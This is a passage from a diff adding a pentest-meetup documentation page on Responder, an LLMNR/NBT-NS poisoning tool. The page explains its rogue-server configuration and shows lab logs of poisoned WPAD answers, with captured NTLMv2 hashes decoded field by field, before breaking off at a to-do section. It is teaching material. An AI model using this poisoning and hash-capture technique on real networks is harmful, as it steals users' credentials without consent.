@@ -1,0 +1,1216 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>6.12. Responder &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="6. Pentest Network Tools" href="../pentest_network_tools.html"/>
+        <link rel="next" title="6.13. socat vs (nc vs ncat vs netcat)" href="socat.html"/>
+        <link rel="prev" title="6.11. Proxy Chains" href="proxychains.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="aircrack-ng.html">6.1. aircrack-ng</a></li>
+<li class="toctree-l2"><a class="reference internal" href="beef.html">6.2. BeEF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="burp_suite.html">6.3. Burp Suite and ZAP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="curl.html">6.4. curl</a></li>
+<li class="toctree-l2"><a class="reference internal" href="drive_droid_kon-boot.html">6.5. DriveDroid &amp; Kon-Boot</a></li>
+<li class="toctree-l2"><a class="reference internal" href="mana.html">6.6. mana</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nmap.html">6.7. nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="openvas.html">6.8. OpenVAS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pcredz.html">6.9. Pcredz pcap credentials</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hak5_pineapple.html">6.10. Hak5 Pineapple</a></li>
+<li class="toctree-l2"><a class="reference internal" href="proxychains.html">6.11. Proxy Chains</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">6.12. Responder</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#gathering-credentials-with-responder">6.12.1. Gathering credentials with Responder</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#responder-tool-specifics">6.12.1.1. Responder tool specifics</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#lm-ntlm-exploitation">6.12.2. LM &amp; NTLM exploitation</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#exploitable-services">6.12.3. Exploitable services</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#wpad">6.12.3.1. WPAD</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#mssql">6.12.3.2. MSSQL</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ftp-http-imap-kerberos-ldap-pop3-smtp">6.12.3.3. FTP, HTTP, IMAP, Kerberos, LDAP, POP3, SMTP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#smb">6.12.3.4. SMB</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="socat.html">6.13. <code class="docutils literal"><span class="pre">socat</span></code> vs (<code class="docutils literal"><span class="pre">nc</span></code> vs <code class="docutils literal"><span class="pre">ncat</span></code> vs <code class="docutils literal"><span class="pre">netcat</span></code>)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sqlmap.html">6.14. sqlmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tcpdump_tcpflow.html">6.15. tcpdump &amp; tcpflow</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tunneling_traffic.html">6.16. Tunneling Traffic</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webgoat.html">6.17. Web Goat</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wireshark.html">6.18. Wireshark</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xsscrapy.html">6.19. xsscrapy</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_network_tools.html">6. Pentest Network Tools</a> &raquo;</li>
+        
+      <li>6.12. Responder</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/network_tools/responder.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="id1">
+<h1>6.12. <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="gathering-credentials-with-responder">
+<h2>6.12.1. Gathering credentials with <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a><a class="headerlink" href="#gathering-credentials-with-responder" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> is a passive credentials gathering tool. From <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a>:</p>
+<blockquote>
+<div><p>Responder is a LLMNR (Link-local Multicast Name Resolution), NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.</p>
+<p>…</p>
+<p>This tool is first an LLMNR, NBT-NS (NetBIOS Name Service) and MDNS responder, it will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: <a class="reference external" href="http://support.microsoft.com/kb/163409">http://support.microsoft.com/kb/163409</a>). By default, the tool will only answer to File Server Service request, which is for SMB. The concept behind this, is to target our answers, and be stealthier on the network. This also helps to ensure that we don’t break legitimate NBT-NS behavior. You can set the -r option via command line if you want this tool to answer to the Workstation Service request name suffix.</p>
+</div></blockquote>
+<p><a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> takes advantage of the fact that Microsoft client name resolution can resort to use broadcast traffic to locate resources, giving an opportunity to impersonate HTTP/SMB/MSSQL/FTP/LDAP servers, getting clients to reveal their credential information. For LM/NTLM/NTLMv2 only the hash is revealed, but that can be used for brute force password guessing.</p>
+<p>For more information read these posts:</p>
+<blockquote>
+<div><p><a class="reference external" href="http://blog.spiderlabs.com/2012/10/introducing-responder-10.html">Introducing Responder-1.0</a></p>
+<p><a class="reference external" href="http://blog.spiderlabs.com/2013/01/owning-windows-networks-with-responder-17.html">Owning Windows Networks with Responder 1.7</a></p>
+<p><a class="reference external" href="http://blog.spiderlabs.com/2013/02/owning-windows-network-with-responder-part-2.html">Owning Windows Networks With Responder Part 2</a></p>
+<p><a class="reference external" href="http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html">Responder 2.0 - Owning Windows Networks part 3</a></p>
+</div></blockquote>
+<div class="section" id="responder-tool-specifics">
+<h3>6.12.1.1. <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> tool specifics<a class="headerlink" href="#responder-tool-specifics" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> is installed via the Kali responder package. It’s designed to be a root-only single user application due to the fact that the configuration file and logs are in the <code class="file docutils literal"><span class="pre">/usr/share/responder</span></code> directory and require root to create/update log files.</p>
+<div class="section" id="responder-conf">
+<h4>6.12.1.1.1. Responder.conf<a class="headerlink" href="#responder-conf" title="Permalink to this headline">¶</a></h4>
+<p>The <code class="file docutils literal"><span class="pre">Responder.conf</span></code> configuration file is located in <code class="file docutils literal"><span class="pre">/usr/share/responder/</span></code> (as are the log files). Comments start with a semi-colon (“;”).</p>
+<dl class="docutils">
+<dt>[Responder Core]</dt>
+<dd><dl class="first last docutils">
+<dt>“SERVICE = On/Off”</dt>
+<dd>Turns on/off the basic rogue servers (and therefore provides a list of them). Currently the servers are: SQL, SMB, Kerberos, FTP, POP, SMTP, IMAP, HTTP, HTTPS, DNS, and LDAP.</dd>
+<dt>“Challenge = 1122334455667788”</dt>
+<dd>Sets the challenge for LM/NTLM challenge/response. This is important as rainbow tables assume a specific, fixed challenge (“1122334455667788”).</dd>
+<dt>“SessionLog = Responder-Session.log”</dt>
+<dd>Main log file.</dd>
+<dt>“RespondTo =”, “RespondToName =”, “DontRespondTo =”, “DontRespondToName =”</dt>
+<dd>Defines hosts to exploit or not exploit.</dd>
+</dl>
+</dd>
+<dt>[HTTP Server]</dt>
+<dd><dl class="first last docutils">
+<dt>“Serve-Always = Off” &amp; “Filename = Denied.html”</dt>
+<dd>Set to always serve a specific file to the victim.</dd>
+<dt>“Serve-Exe = Off” &amp; “ExecFilename = FixInternet.exe”</dt>
+<dd>Set to serve an executable file each time a .exe is detected in an URL.</dd>
+<dt>“WPADScript = …”, “HTMLToServe = …”</dt>
+<dd>Custom PAC script (for WPAD) and HTML for SMB server RespProxySrv.</dd>
+</dl>
+</dd>
+<dt>[HTTPS Server]</dt>
+<dd><dl class="first last docutils">
+<dt>“cert = Certs/responder.crt”, “key = Certs/responder.key”</dt>
+<dd>Certs for serving HTTPS.</dd>
+</dl>
+</dd>
+</dl>
+</div>
+<div class="section" id="log-files">
+<h4>6.12.1.1.2. Log files<a class="headerlink" href="#log-files" title="Permalink to this headline">¶</a></h4>
+<p>Running the following can show the latest <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> log files updated:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">ls -lrt /usr/share/responder/*.<span class="o">{</span>log,txt<span class="o">}</span>
+</span><span class="hll">ls -lrt /usr/share/responder/HTTPCookies
+</span></pre></div>
+</div>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> ls -lrt /usr/share/responder/*.<span class="o">{</span>log,txt<span class="o">}</span>
+</span><span class="go">-rw-r--r-- 1 root root     0 May 13 18:03 /usr/share/responder/Analyze-LLMNR-NBT-NS.log</span>
+<span class="go">-rw-r--r-- 1 root root   607 May 13 22:09 /usr/share/responder/HTTP-NTLMv2-Client-192.168.1.103.txt</span>
+<span class="go">-rw-r--r-- 1 root root   177 May 13 22:09 /usr/share/responder/LLMNR-NBT-NS.log</span>
+<span class="go">-rw-r--r-- 1 root root 17335 May 13 22:09 /usr/share/responder/Responder-Session.log</span>
+<span class="hll"><span class="gp">hacker@kali:~$</span> ls -lrt /usr/share/responder/HTTPCookies
+</span><span class="go">total 24</span>
+<span class="go">-rw-r--r-- 1 root root 112 May 13 22:09 HTTP-Cookie-request-cdp1.public-trust.com-from-192.168.1.103.txt</span>
+<span class="go">-rw-r--r-- 1 root root 199 May 13 22:09 HTTP-Cookie-request-gb.symcd.com-from-192.168.1.103.txt</span>
+<span class="go">-rw-r--r-- 1 root root  89 May 13 22:09 HTTP-Cookie-request-gb.symcb.com-from-192.168.1.103.txt</span>
+<span class="go">-rw-r--r-- 1 root root 414 May 13 22:09 HTTP-Cookie-request-ocsp.digicert.com-from-192.168.1.103.txt</span>
+<span class="go">-rw-r--r-- 1 root root 221 May 13 22:09 HTTP-Cookie-request-crl3.digicert.com-from-192.168.1.103.txt</span>
+<span class="go">-rw-r--r-- 1 root root 221 May 13 22:09 HTTP-Cookie-request-crl4.digicert.com-from-192.168.1.103.txt</span>
+</pre></div>
+</div>
+<p>“SessionLog = Responder-Session.log” sets the main log file which saves the console output from <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a>. HTTP cookies are stored in the subdirectory <code class="file docutils literal"><span class="pre">HTTPCookies</span></code> while each of the servers will have 1 or more “.log” files of their own. For example, captured hashes would have the log file name [SMB/HTTP/SQL]-[NTLMv1/v2]-Client-IP.txt with data stored in the John Jumbo format.</p>
+<p>Here are some actual logs after a very short run: <code class="file docutils literal"><span class="pre">LLMNR-NBT-NS.log</span></code> shows the LLMNR/NBT-NS poisoning and <code class="file docutils literal"><span class="pre">HTTP-NTLMv2-Client-192.168.1.103.txt</span></code> shows the HTTP server’s captured NTLMv2 hashes from IP 192.168.1.103:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">cat /usr/share/responder/LLMNR-NBT-NS.log
+</span><span class="hll">cat /usr/share/responder/HTTP-NTLMv2-Client-192.168.1.103.txt
+</span><span class="hll">cat /usr/share/responder/Responder-Session.log
+</span></pre></div>
+</div>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> cat /usr/share/responder/LLMNR-NBT-NS.log
+</span><span class="go">LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : wpad.</span>
+<span class="go">LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : isaproxysrv.</span>
+<span class="hll"><span class="gp">hacker@kali:~$</span> cat /usr/share/responder/HTTP-NTLMv2-Client-192.168.1.103.txt
+</span><span class="go">jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000</span>
+<span class="hll"><span class="gp">hacker@kali:~$</span> cat /usr/share/responder/Responder-Session.log
+</span><span class="go">05/13/2015 10:07:04 PM Responder Started</span>
+<span class="go">Command line args:[&#39;/usr/bin/responder&#39;, &#39;-i&#39;, &#39;192.168.1.104&#39;, &#39;-w&#39;, &#39;-F&#39;]</span>
+<span class="go">05/13/2015 10:09:19 PM LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : wpad.</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP GET request from : 192.168.1.103. The HTTP URL requested was: /wpad.dat</span>
+<span class="go">05/13/2015 10:09:36 PM No cookies were sent with this request</span>
+<span class="hll"><span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 hash captured from :192.168.1.103</span>
+</span><span class="hll"><span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 User is : jgm</span>
+</span><span class="hll"><span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Domain is :taxing</span>
+</span><span class="hll"><span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Hostname is :TAXING</span>
+</span><span class="hll"><span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Complete hash is :jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000</span>
+</span><span class="go">05/13/2015 10:09:36 PM [+]WPAD (auth) file sent to: 192.168.1.103</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP GET request from : 192.168.1.103. The HTTP URL requested was: /wpad.dat</span>
+<span class="go">05/13/2015 10:09:36 PM No cookies were sent with this request</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 hash captured from :192.168.1.103</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 User is : jgm</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Domain is :taxing</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Hostname is :TAXING</span>
+<span class="go">05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Complete hash is :jgm::taxing:1122334455667788:F72F2131E5F245D1FDC187FBB10C5D65:010100000000000042A43E2C048ED00194B7398786D7F504000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000</span>
+<span class="go">05/13/2015 10:09:36 PM [+]WPAD (auth) file sent to: 192.168.1.103</span>
+<span class="go">05/13/2015 10:09:36 PM LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : isaproxysrv.</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p>Cleaning up the log files is accomplished by:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="nv">RDIR</span><span class="o">=</span>/usr/share/responder
+<span class="hll"><span class="nv">$SUDO</span> rm <span class="se">\</span>
+</span><span class="hll">  <span class="nv">$RDIR</span>/*.<span class="o">{</span>log,txt<span class="o">}</span> <span class="se">\</span>
+</span><span class="hll">  <span class="nv">$RDIR</span>/HTTPCookies/* <span class="se">\</span>
+</span><span class="hll">  <span class="nv">$RDIR</span>/Responder-Session.log
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="captured-challenge-file-format">
+<h4>6.12.1.1.3. Captured challenge file format<a class="headerlink" href="#captured-challenge-file-format" title="Permalink to this headline">¶</a></h4>
+<p>The captured hashes in <code class="file docutils literal"><span class="pre">HTTP-NTLMv2-Client-$T.txt</span></code> look like:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:/usr/share/responder$</span> ls HTTP-*
+<span class="go">HTTP-NTLMv2-Client-192.168.1.103.txt</span>
+<span class="gp">hacker@kali:/usr/share/responder$</span> cat HTTP-*
+<span class="go">jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042</span>
+<span class="go">A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D</span>
+<span class="go">0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C00030028</span>
+<span class="go">0073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C</span>
+<span class="go">000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000</span>
+<span class="go">1000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A00100000</span>
+<span class="go">0000000000000000000000000000000900240048005400540050002F003100390032002E00310036</span>
+<span class="go">0038002E0031002E003100300034000000000000000000</span>
+</pre></div>
+</div>
+<p>This consists of:</p>
+<ul class="simple">
+<li>“jgm” = user</li>
+<li>“taxing” = server</li>
+<li>“1122334455667788” = server challenge</li>
+<li>“BE429406642BF55E51748A867ACDD409” = NTLMv2 hash (first 32 bits of NTLMv2 type 3 response)</li>
+<li>the blob = everything except for the first 32 bits of NTLMv2 type 3 response</li>
+</ul>
+<p>So what’s in “the blob”?</p>
+<table border="1" class="docutils">
+<colgroup>
+<col width="34%" />
+<col width="22%" />
+<col width="44%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">blob field</th>
+<th class="head">hex data</th>
+<th class="head">data meaning</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>blob signature</td>
+<td>01010000</td>
+<td>indicates start of blob</td>
+</tr>
+<tr class="row-odd"><td>reserved</td>
+<td>00000000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>timestamp</td>
+<td>42A43E2C048ED001</td>
+<td>little-endian 64-bit signed number of
+tenths of a microsecond since 1601/1/1</td>
+</tr>
+<tr class="row-odd"><td>client nonce</td>
+<td>13456A9D55B36A4E</td>
+<td>client challenge</td>
+</tr>
+<tr class="row-even"><td>unknown</td>
+<td>00000000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>target information data</td>
+<td>&#160;</td>
+<td>target data from client’s type 2 response</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; type: 2 (NetBIOS domain name)</td>
+<td>0200</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; length: 6 bytes</td>
+<td>0600</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; data:</td>
+<td>53004D004200</td>
+<td>“SMB”</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; type: 1 (server name)</td>
+<td>0100</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; length: 22</td>
+<td>1600</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; data:</td>
+<td>53004D0042002D00</td>
+<td>“SMBTOOLKIT”</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>54004F004F004C00</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>4B0049005400</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; type: 4 (dns domain name)</td>
+<td>0400</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; length: 18</td>
+<td>1200</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; data:</td>
+<td>73006D0062002E00</td>
+<td>“smb.local”</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>6C006F0063006100</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>6C00</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; type: 3 (dns server name)</td>
+<td>0300</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; length: 40</td>
+<td>2800</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; data:</td>
+<td>7300650072007600</td>
+<td>“server2003.smb.local”</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>6500720032003000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>300033002E007300</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>6D0062002E006C00</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>6F00630061006C00</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; type: 5 (FQDN of forest)</td>
+<td>0500</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; length: 18</td>
+<td>1200</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; data:</td>
+<td>73006D0062002E00</td>
+<td>“smb.local”</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>6C006F0063006100</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>6C00</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; type: 8 (single host data)</td>
+<td>0800</td>
+<td>when client/server same host</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; length: 48</td>
+<td>3000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; data:</td>
+<td>30000000</td>
+<td>32 unsigned length = 48</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>00000000</td>
+<td>Z4 = 0</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>01000000</td>
+<td>1 = indicates custom data present</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>00100000</td>
+<td>4 bytes custom data blob</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>5436C9CCC131C3A8</td>
+<td>machine ID (32 bytes)</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>8D569E3A3CAD25E1</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>882D24E33F82CB96</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>0F8C6809D4139D3F</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; type: 10 (channel bindings)</td>
+<td>0A00</td>
+<td>hash of channel bindings</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; length: 16</td>
+<td>1000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; data:</td>
+<td>0000000000000000</td>
+<td>0 means no bindings</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>0000000000000000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; type: 9  (SPN of target)</td>
+<td>0900</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; length: 36</td>
+<td>2400</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; data:</td>
+<td>4800540054005000</td>
+<td>“HTTP/192.168.1.104”</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>2F00310039003200</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>2E00310036003800</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt;</td>
+<td>2E0031002E003100</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt;</td>
+<td>30003400</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>&gt;&gt; type: 0</td>
+<td>0000</td>
+<td>AV type 0, length 0 at list end</td>
+</tr>
+<tr class="row-odd"><td>&gt;&gt; length: 0</td>
+<td>0000</td>
+<td>&#160;</td>
+</tr>
+<tr class="row-even"><td>unknown</td>
+<td>00000000</td>
+<td>&#160;</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="section" id="running-responder">
+<h4>6.12.1.1.4. Running <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a><a class="headerlink" href="#running-responder" title="Permalink to this headline">¶</a></h4>
+<div class="admonition-todo admonition" id="index-0">
+<p class="first admonition-title">Todo</p>
+<p class="last">provide details of running <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a></p>
+</div>
+<ol class="arabic">
+<li><p class="first"><code class="file docutils literal"><span class="pre">/usr/share/responder/</span></code> setup</p>
+<ol class="arabic">
